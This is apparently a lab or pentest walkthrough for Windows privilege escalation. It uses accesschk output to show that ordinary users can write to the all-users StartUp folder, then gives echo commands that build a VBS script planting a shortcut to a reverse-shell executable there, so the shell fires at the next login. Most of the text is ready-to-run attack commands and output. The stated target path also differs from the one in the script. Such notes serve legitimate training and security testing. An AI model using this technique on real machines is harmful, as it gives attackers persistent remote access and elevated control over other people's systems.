Using accesschk.exe, note if the `BUILTIN\Users` group can write files to the StartUp directory:

`accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"`

Output:

```
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
  RW BUILTIN\Users
  RW WIN-QBA94KB3IOF\Administrator
  RW WIN-QBA94KB3IOF\admin
  RW NT AUTHORITY\SYSTEM
  RW BUILTIN\Administrators
  R  Everyone

```

Create the following vbs script `CreateShortcut.vbs` after you set the path `oLink.TargetPath = "C:\PrivEsc\reverse.exe"` to the path of the reverse shell on the target.

Creating the script

```
echo Set oWS = WScript.CreateObject("WScript.Shell") > CreateShortcut.vbs
echo sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk" >> CreateShortcut.vbs
echo Set oLink = oWS.CreateShortcut(sLinkFile) >> CreateShortcut.vbs
echo oLink.TargetPath = "C:\Users\user\reverse.exe" >> CreateShortcut.vbs
echo oLink.Save >> CreateShortcut.vbs
```

`cscript CreateShortcut.vbs`

When a user logs in, the reverse shell will be triggered.